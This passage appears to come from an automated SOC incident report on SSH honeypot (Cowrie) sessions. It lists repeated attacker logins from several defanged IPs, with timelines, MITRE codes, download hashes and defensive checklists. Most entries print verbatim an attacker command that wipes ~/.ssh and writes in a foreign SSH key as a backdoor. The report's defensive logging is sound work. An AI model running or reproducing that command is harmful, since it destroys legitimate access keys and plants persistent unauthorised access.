| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:39:00` | `cowrie.session.connect` |
| `2026-06-12 11:39:00` | `cowrie.client.version` |
| `2026-06-12 11:39:00` | `cowrie.client.kex` |
| `2026-06-12 11:39:00` | `cowrie.login.success` |
| `2026-06-12 11:39:00` | `cowrie.session.params` |
| `2026-06-12 11:39:00` | `cowrie.command.input` |
| `2026-06-12 11:39:00` | `cowrie.command.failed` |
| `2026-06-12 11:39:00` | `cowrie.log.closed` |
| `2026-06-12 11:39:00` | `cowrie.session.params` |
| `2026-06-12 11:39:00` | `cowrie.command.input` |
| `2026-06-12 11:39:00` | `cowrie.session.file_download` |
| `2026-06-12 11:39:00` | `cowrie.log.closed` |
| `2026-06-12 11:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7fdddb027c

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:39 |
| **Last Seen** | 2026-06-12 11:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:39:01` | `cowrie.session.connect` |
| `2026-06-12 11:39:01` | `cowrie.client.version` |
| `2026-06-12 11:39:01` | `cowrie.client.kex` |
| `2026-06-12 11:39:01` | `cowrie.login.success` |
| `2026-06-12 11:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48540e3b63a1

| Field | Detail |
|---|---|
| **Source IP** | `175.182.37[.]66` |
| **First Seen** | 2026-06-12 11:41 |
| **Last Seen** | 2026-06-12 11:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:41:22` | `cowrie.session.connect` |
| `2026-06-12 11:41:22` | `cowrie.client.version` |
| `2026-06-12 11:41:22` | `cowrie.client.kex` |
| `2026-06-12 11:41:22` | `cowrie.login.success` |
| `2026-06-12 11:41:23` | `cowrie.session.params` |
| `2026-06-12 11:41:23` | `cowrie.command.input` |
| `2026-06-12 11:41:23` | `cowrie.command.failed` |
| `2026-06-12 11:41:23` | `cowrie.log.closed` |
| `2026-06-12 11:41:23` | `cowrie.session.params` |
| `2026-06-12 11:41:23` | `cowrie.command.input` |
| `2026-06-12 11:41:23` | `cowrie.session.file_download` |
| `2026-06-12 11:41:23` | `cowrie.log.closed` |
| `2026-06-12 11:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.182.37[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.182.37[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffaffee0c2d9

| Field | Detail |
|---|---|
| **Source IP** | `175.182.37[.]66` |
| **First Seen** | 2026-06-12 11:41 |
| **Last Seen** | 2026-06-12 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:41:25` | `cowrie.session.connect` |
| `2026-06-12 11:41:25` | `cowrie.client.version` |
| `2026-06-12 11:41:25` | `cowrie.client.kex` |
| `2026-06-12 11:41:26` | `cowrie.login.success` |
| `2026-06-12 11:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.182.37[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.182.37[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-229272a41fc9

| Field | Detail |
|---|---|
| **Source IP** | `175.182.37[.]66` |
| **First Seen** | 2026-06-12 11:44 |
| **Last Seen** | 2026-06-12 11:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:44:39` | `cowrie.session.connect` |
| `2026-06-12 11:44:39` | `cowrie.client.version` |
| `2026-06-12 11:44:39` | `cowrie.client.kex` |
| `2026-06-12 11:44:40` | `cowrie.login.success` |
| `2026-06-12 11:44:40` | `cowrie.session.params` |
| `2026-06-12 11:44:40` | `cowrie.command.input` |
| `2026-06-12 11:44:40` | `cowrie.command.failed` |
| `2026-06-12 11:44:40` | `cowrie.log.closed` |
| `2026-06-12 11:44:41` | `cowrie.session.params` |
| `2026-06-12 11:44:41` | `cowrie.command.input` |
| `2026-06-12 11:44:41` | `cowrie.session.file_download` |
| `2026-06-12 11:44:41` | `cowrie.log.closed` |
| `2026-06-12 11:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.182.37[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.182.37[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc61dcea903e

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:44 |
| **Last Seen** | 2026-06-12 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:44:44` | `cowrie.session.connect` |
| `2026-06-12 11:44:44` | `cowrie.client.version` |
| `2026-06-12 11:44:44` | `cowrie.client.kex` |
| `2026-06-12 11:44:44` | `cowrie.login.success` |
| `2026-06-12 11:44:44` | `cowrie.session.params` |
| `2026-06-12 11:44:44` | `cowrie.command.input` |
| `2026-06-12 11:44:45` | `cowrie.command.failed` |
| `2026-06-12 11:44:45` | `cowrie.log.closed` |
| `2026-06-12 11:44:45` | `cowrie.session.params` |
| `2026-06-12 11:44:45` | `cowrie.command.input` |
| `2026-06-12 11:44:45` | `cowrie.session.file_download` |
| `2026-06-12 11:44:45` | `cowrie.log.closed` |
| `2026-06-12 11:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c776bef9b88

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:44 |
| **Last Seen** | 2026-06-12 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:44:46` | `cowrie.session.connect` |
| `2026-06-12 11:44:46` | `cowrie.client.version` |
| `2026-06-12 11:44:46` | `cowrie.client.kex` |
| `2026-06-12 11:44:46` | `cowrie.login.success` |
| `2026-06-12 11:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d005a8d9431d

| Field | Detail |
|---|---|
| **Source IP** | `175.182.37[.]66` |
| **First Seen** | 2026-06-12 11:44 |
| **Last Seen** | 2026-06-12 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:44:50` | `cowrie.session.connect` |
| `2026-06-12 11:44:50` | `cowrie.client.version` |
| `2026-06-12 11:44:50` | `cowrie.client.kex` |
| `2026-06-12 11:44:51` | `cowrie.login.success` |
| `2026-06-12 11:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.182.37[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.182.37[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-094c5aa0fb1e

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:47 |
| **Last Seen** | 2026-06-12 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:47:42` | `cowrie.session.connect` |
| `2026-06-12 11:47:42` | `cowrie.client.version` |
| `2026-06-12 11:47:42` | `cowrie.client.kex` |
| `2026-06-12 11:47:43` | `cowrie.login.success` |
| `2026-06-12 11:47:43` | `cowrie.session.params` |
| `2026-06-12 11:47:43` | `cowrie.command.input` |
| `2026-06-12 11:47:43` | `cowrie.command.failed` |
| `2026-06-12 11:47:43` | `cowrie.log.closed` |
| `2026-06-12 11:47:43` | `cowrie.session.params` |
| `2026-06-12 11:47:43` | `cowrie.command.input` |
| `2026-06-12 11:47:43` | `cowrie.session.file_download` |
| `2026-06-12 11:47:43` | `cowrie.log.closed` |
| `2026-06-12 11:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a87f57f44fb8

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:47 |
| **Last Seen** | 2026-06-12 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:47:44` | `cowrie.session.connect` |
| `2026-06-12 11:47:44` | `cowrie.client.version` |
| `2026-06-12 11:47:44` | `cowrie.client.kex` |
| `2026-06-12 11:47:44` | `cowrie.login.success` |
| `2026-06-12 11:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f99fa1e05a

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:58 |
| **Last Seen** | 2026-06-12 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:58:35` | `cowrie.session.connect` |
| `2026-06-12 11:58:35` | `cowrie.client.version` |
| `2026-06-12 11:58:35` | `cowrie.client.kex` |
| `2026-06-12 11:58:35` | `cowrie.login.success` |
| `2026-06-12 11:58:35` | `cowrie.session.params` |
| `2026-06-12 11:58:35` | `cowrie.command.input` |
| `2026-06-12 11:58:35` | `cowrie.command.failed` |
| `2026-06-12 11:58:35` | `cowrie.log.closed` |
| `2026-06-12 11:58:35` | `cowrie.session.params` |
| `2026-06-12 11:58:35` | `cowrie.command.input` |
| `2026-06-12 11:58:35` | `cowrie.session.file_download` |
| `2026-06-12 11:58:35` | `cowrie.log.closed` |
| `2026-06-12 11:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6795922a608e

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:58 |
| **Last Seen** | 2026-06-12 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:58:36` | `cowrie.session.connect` |
| `2026-06-12 11:58:36` | `cowrie.client.version` |
| `2026-06-12 11:58:36` | `cowrie.client.kex` |
| `2026-06-12 11:58:36` | `cowrie.login.success` |
| `2026-06-12 11:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418456bc5357

| Field | Detail |
|---|---|
| **Source IP** | `45.136.50[.]69` |
| **First Seen** | 2026-06-12 13:03 |
| **Last Seen** | 2026-06-12 13:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:03:10` | `cowrie.session.connect` |
| `2026-06-12 13:03:10` | `cowrie.client.version` |
| `2026-06-12 13:03:10` | `cowrie.client.kex` |
| `2026-06-12 13:03:11` | `cowrie.login.success` |
| `2026-06-12 13:03:12` | `cowrie.session.params` |
| `2026-06-12 13:03:12` | `cowrie.command.input` |
| `2026-06-12 13:03:12` | `cowrie.command.failed` |
| `2026-06-12 13:03:12` | `cowrie.log.closed` |
| `2026-06-12 13:03:12` | `cowrie.session.params` |
| `2026-06-12 13:03:12` | `cowrie.command.input` |
| `2026-06-12 13:03:12` | `cowrie.session.file_download` |
| `2026-06-12 13:03:12` | `cowrie.log.closed` |
| `2026-06-12 13:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.136.50[.]69` to AbuseIPDB if not already reported
- [ ] Block `45.136.50[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc055454b82

| Field | Detail |
|---|---|
| **Source IP** | `45.136.50[.]69` |
| **First Seen** | 2026-06-12 13:03 |
| **Last Seen** | 2026-06-12 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:03:15` | `cowrie.session.connect` |
| `2026-06-12 13:03:15` | `cowrie.client.version` |
| `2026-06-12 13:03:15` | `cowrie.client.kex` |
| `2026-06-12 13:03:16` | `cowrie.login.success` |
| `2026-06-12 13:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.136.50[.]69` to AbuseIPDB if not already reported
- [ ] Block `45.136.50[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b26fdac5d9f

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:09 |
| **Last Seen** | 2026-06-12 13:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:09:17` | `cowrie.session.connect` |
| `2026-06-12 13:09:17` | `cowrie.client.version` |
| `2026-06-12 13:09:17` | `cowrie.client.kex` |
| `2026-06-12 13:09:18` | `cowrie.login.success` |
| `2026-06-12 13:09:18` | `cowrie.session.params` |
| `2026-06-12 13:09:18` | `cowrie.command.input` |
| `2026-06-12 13:09:18` | `cowrie.command.failed` |
| `2026-06-12 13:09:19` | `cowrie.log.closed` |
| `2026-06-12 13:09:19` | `cowrie.session.params` |
| `2026-06-12 13:09:19` | `cowrie.command.input` |
| `2026-06-12 13:09:19` | `cowrie.session.file_download` |
| `2026-06-12 13:09:19` | `cowrie.log.closed` |
| `2026-06-12 13:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74546d3fe57

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:09 |
| **Last Seen** | 2026-06-12 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:09:22` | `cowrie.session.connect` |
| `2026-06-12 13:09:22` | `cowrie.client.version` |
| `2026-06-12 13:09:22` | `cowrie.client.kex` |
| `2026-06-12 13:09:23` | `cowrie.login.success` |
| `2026-06-12 13:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd235579947c

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:10 |
| **Last Seen** | 2026-06-12 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:10:39` | `cowrie.session.connect` |
| `2026-06-12 13:10:39` | `cowrie.client.version` |
| `2026-06-12 13:10:39` | `cowrie.client.kex` |
| `2026-06-12 13:10:39` | `cowrie.login.success` |
| `2026-06-12 13:10:39` | `cowrie.session.params` |
| `2026-06-12 13:10:39` | `cowrie.command.input` |
